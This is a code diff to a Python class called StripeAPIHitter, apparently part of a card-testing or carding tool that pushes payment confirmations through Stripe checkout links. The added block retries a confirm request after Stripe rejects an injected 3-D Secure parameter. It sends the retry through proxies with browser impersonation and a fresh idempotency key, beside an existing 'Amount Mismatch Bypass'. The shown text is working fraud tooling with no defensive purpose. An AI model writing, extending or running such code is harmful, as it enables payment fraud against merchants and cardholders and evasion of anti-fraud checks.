@@ -641,6 +641,17 @@ class StripeAPIHitter:
                 err_code = confirm_json.get('error', {}).get('code')
                 err_msg = confirm_json.get('error', {}).get('message', '') or ''
                 
+                # Parameter Unknown Bypass
+                # If Stripe rejects our injected "payment_method_options[card][request_three_d_secure]" because the specific 
+                # checkout link does not support it (e.g. basic SetupIntents or strict PaymentIntents), we must delete it and retry.
+                if confirm_res.status_code == 400 and err_code == 'parameter_unknown' and 'payment_method_options' in err_msg:
+                    del confirm_data['payment_method_options[card][request_three_d_secure]']
+                    confirm_headers["Idempotency-Key"] = str(uuid.uuid4())
+                    confirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(confirm_url, headers=confirm_headers, data=confirm_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                    confirm_json = confirm_res.json()
+                    err_code = confirm_json.get('error', {}).get('code')
+                    err_msg = confirm_json.get('error', {}).get('message', '') or ''
+                
                 # Unified Amount Mismatch Bypass
                 if confirm_res.status_code != 200 and (err_code == 'checkout_amount_mismatch' or 'expected amount' in err_msg.lower() or 'expected_amount' in err_msg):
                     # Fetch the correct, updated amount from the checkout session
